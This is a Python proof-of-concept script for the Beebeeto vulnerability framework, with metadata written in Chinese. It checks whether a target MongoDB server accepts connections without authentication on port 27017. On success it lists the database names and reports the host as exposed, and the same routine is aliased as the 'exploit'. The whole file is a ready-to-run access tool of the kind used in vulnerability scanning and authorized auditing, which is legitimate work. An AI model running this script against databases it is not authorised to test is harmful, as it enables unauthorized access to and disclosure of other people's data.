#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/ff0000team/Beebeeto-framework
"""

import pymongo
import urllib2
import urlparse

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0194',
            'name': 'Mongodb 配置不当导致未授权访问漏洞 POC',
            'author': '1024',
            'create_date': '2014-12-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [28017],
            'layer3_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Mongodb',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['Mongodb信息泄露漏洞', '默认空口令未授权访问漏洞', '27017/28017端口'],
            'desc': 'mongodb启动时未加 --auth选项，导致无需认证即可连接mongodb数据库，从而导致一系列安全问题。',
            'references': ['N/A',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        ip_addr = urlparse.urlparse(verify_url).netloc

        if args['options']['verbose']:
            print '[*] Connect mongodb: ' + ip_addr + ':27017'
        try:

            conn = pymongo.MongoClient(ip_addr, 27017, socketTimeoutMS=3000)
            dbname = conn.database_names()
            if dbname:
                args['success'] = True
                args['poc_ret']['vul_url'] = ip_addr + ':27017'
                args['poc_ret']['database_names'] = dbname
        except Exception, e:
            print str(e)
            args['success'] = False
            return args
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
  